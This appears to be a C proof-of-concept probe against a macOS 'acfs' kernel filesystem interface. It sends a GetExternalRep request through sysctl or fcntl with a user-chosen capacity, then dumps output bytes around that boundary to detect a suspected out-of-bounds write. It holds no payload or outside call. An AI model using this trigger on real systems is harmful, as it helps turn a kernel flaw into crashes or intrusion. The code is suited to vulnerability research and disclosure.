#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/sysctl.h>
#include <sys/types.h>
#include <unistd.h>

#define ACFS_GET_EXTERNAL_REP 0x20000d32

struct acfs_get_external_rep {
    uint64_t opaque0;
    uint64_t key0;
    uint64_t key1;
    char name[0x20];
    uint32_t item_size;
    uint32_t total_capacity;
    uint64_t opaque40;
    uint64_t output_ptr;
    uint8_t opaque50[0x10];
};

_Static_assert(sizeof(struct acfs_get_external_rep) == 0x60,
               "unexpected GetExternalRep layout");
_Static_assert(__builtin_offsetof(struct acfs_get_external_rep, name) == 0x18,
               "unexpected name offset");
_Static_assert(__builtin_offsetof(struct acfs_get_external_rep, item_size) == 0x38,
               "unexpected item-size offset");
_Static_assert(__builtin_offsetof(struct acfs_get_external_rep, total_capacity) == 0x3c,
               "unexpected capacity offset");
_Static_assert(__builtin_offsetof(struct acfs_get_external_rep, output_ptr) == 0x48,
               "unexpected output-pointer offset");

int main(int argc, char **argv) {
    const char *path = argc > 1 ? argv[1] : "/Volumes/codexVol/codex_probe";
    const int use_fcntl = argc > 2 && strcmp(argv[2], "fcntl") == 0;
    const uint32_t capacity = argc > 2 && !use_fcntl
                                  ? (uint32_t)strtoul(argv[2], NULL, 0)
                                  : 0x100;
    const size_t output_size = 0x100000;
    uint8_t *output;
    struct acfs_get_external_rep req;
    struct vfsconf vfc;
    uintptr_t req_ptr;
    int mib[7];
    int fd;
    int rc;
    int saved_errno;

    setvbuf(stdout, NULL, _IONBF, 0);
    output = malloc(output_size);
    if (output == NULL) {
        perror("malloc(output)");
        return 1;
    }
    memset(&req, 0, sizeof(req));
    memset(output, 0x43, output_size);
    memcpy(req.name, "codex", sizeof("codex"));
    req.total_capacity = capacity;
    req.output_ptr = (uint64_t)(uintptr_t)output;

    fd = open(path, O_RDWR | O_CREAT, 0600);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    if (getvfsbyname("acfs", &vfc) != 0) {
        perror("getvfsbyname(acfs)");
        close(fd);
        return 1;
    }

    req_ptr = (uintptr_t)&req;
    mib[0] = CTL_VFS;
    mib[1] = vfc.vfc_typenum;
    mib[2] = 0;
    mib[3] = fd;
    mib[4] = ACFS_GET_EXTERNAL_REP;
    mib[5] = (int)(uint32_t)req_ptr;
    mib[6] = (int)(uint32_t)(req_ptr >> 32);

    printf("uid=%u fd=%d path=%s route=%s cmd=0x%08x req=%p output=%p B=0x%x\n",
           getuid(), fd, path, use_fcntl ? "fcntl" : "sysctl",
           ACFS_GET_EXTERNAL_REP,
           (void *)&req, (void *)output, capacity);
    printf("one-record reply geometry: opcode=0x42 s=0x%08x t=0x%08x wire=0x%08x\n",
           capacity - 0x1c, capacity + 8, capacity + 0x24);

    errno = 0;
    if (use_fcntl) {
        rc = fcntl(fd, ACFS_GET_EXTERNAL_REP, &req);
    } else {
        rc = sysctl(mib, sizeof(mib) / sizeof(mib[0]), NULL, NULL, NULL, 0);
    }
    saved_errno = errno;
    printf("%s rc=%d errno=%d (%s) item_size=0x%x total=0x%x\n",
           use_fcntl ? "fcntl" : "sysctl", rc, saved_errno,
           strerror(saved_errno),
           req.item_size, req.total_capacity);
    printf("output[B-8..B+15]=");
    for (size_t i = capacity - 8; i < capacity + 16; ++i) {
        printf("%02x", output[i]);
    }
    putchar('\n');

    close(fd);
    free(output);
    return rc == 0 ? 0 : 2;
}
